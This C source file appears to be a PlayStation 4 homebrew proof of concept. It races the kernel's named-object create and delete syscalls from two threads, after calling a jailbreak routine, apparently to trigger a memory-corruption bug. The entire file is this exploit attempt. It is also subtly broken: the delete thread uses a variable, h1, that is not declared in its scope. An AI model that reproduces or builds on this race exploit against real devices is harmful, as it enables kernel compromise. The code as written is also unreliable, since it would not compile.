#include "ps4.h"

#define SYS_NAMEDOBJ_CREATE 557
#define SYS_NAMEDOBJ_DELETE 558

static int namedobj_create(const char* name, 
                            int fd, 
                            uint32_t flags) {
    return syscall(SYS_NAMEDOBJ_CREATE, name, fd, flags);
}

static int namedobj_delete(uint32_t handle, 
                            uint16_t flags) {
    return syscall(SYS_NAMEDOBJ_DELETE, handle, flags);
}

static volatile int g_handle  = -1;
static volatile int g_running =  1;

void* thread_delete(void* arg) {
    printf_debug("thread_delete start\n");

    while (g_running) {
        if (g_handle != -1) {
            printf_debug("thread_delete saw handle\n");

            int h    = g_handle;
            g_handle = -1;

            printf_debug("thread_delete deleting\n");

            namedobj_delete(h, 0x107);
            namedobj_delete(h1, 0x101);

            printf_debug("thread_delete deleted\n");
        }
    }

    printf_debug("thread_delete exit\n");
    return NULL;
}

void* thread_create(void* arg) {
    printf_debug("thread_create start\n");

    while (g_running) {
        SceKernelEqueue eq;

        printf_debug("creating equeue\n");
        sceKernelCreateEqueue(&eq, "poc");

        int fd = (int)eq;

        printf_debug("fd=%d\n", fd);

        if (fd < 0) continue;

        int h = namedobj_create("poc", fd, 0x107);
        int h1 = namedobj_create("poc", fd, 0x107);

        printf_debug("handle=%d\n", h);

        if (h != -1) {
            g_handle = h;
            printf_debug("handle stored\n");
        }
    }

    printf_debug("thread_create exit\n");
    return NULL;
}

int _main(struct thread *td)
{
    UNUSED(td);

    initKernel();
    initLibc();
    initPthread();
    initNetwork();
    jailbreak();
    initSysUtil();

    ScePthread tA, tB;

    printf_debug("=== namedobj race ===\n");

    printf_debug("creating thread_delete\n");
    scePthreadCreate(&tA, NULL, thread_delete, NULL, "del");

    printf_debug("creating thread_create\n");
    scePthreadCreate(&tB, NULL, thread_create, NULL, "cre");

    printf_debug("threads created\n");

    sceKernelSleep(10);

    printf_debug("stopping threads\n");
    g_running = 0;

    scePthreadJoin(tA, NULL);
    scePthreadJoin(tB, NULL);

    printf_debug("joined threads\n");

    printf_debug("=== namedobj Done ===\n");

    return 0;
}